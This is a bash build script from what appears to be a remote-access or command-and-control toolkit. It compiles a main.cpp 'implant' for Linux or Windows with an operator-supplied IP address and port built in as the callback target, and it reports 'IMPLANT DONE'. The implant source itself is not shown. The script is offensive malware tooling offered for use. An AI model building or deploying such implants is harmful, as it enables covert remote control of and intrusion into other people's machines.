#!/bin/bash

OS=$1
IP=$2
PORT=$3
OUTPUT=$4


if [ -z "$OS" ] || [ -z "$IP" ] || [ -z "$PORT" ] || [ -z "$OUTPUT" ]; then
    echo "Usage: $0 <linux/windows> <ip> <port> <output name>"
    exit 1
fi

src="main.cpp"

if [ $OS == "linux" ]; then
    #gcc $src -o $linux_out -lcjson --static -lcrypto -lssl
    g++ $src -o $OUTPUT -static -lcjson -lssl -lcrypto -ldl -lpthread \
    -DADDR="\"$IP\"" -DPORT=$PORT #-Dfile_path=$ID_PATH
    echo "[+] LINUX IMPLANT DONE\n"
    exit 1
elif [ $OS == "windows" ]; then
    i686-w64-mingw32-g++ -Wall -O2 -ffunction-sections -fdata-sections -fmerge-all-constants \
                        -static-libstdc++ -static-libgcc ./includes/cJSON/cJSON.c \
                        $src -o $OUTPUT -lws2_32 -lsecur32 \
                        -DADDR="\"$IP\"" -DPORT=$PORT 
    echo "[+] WINDOWS IMPLANT DONE\n"
    exit 1
fi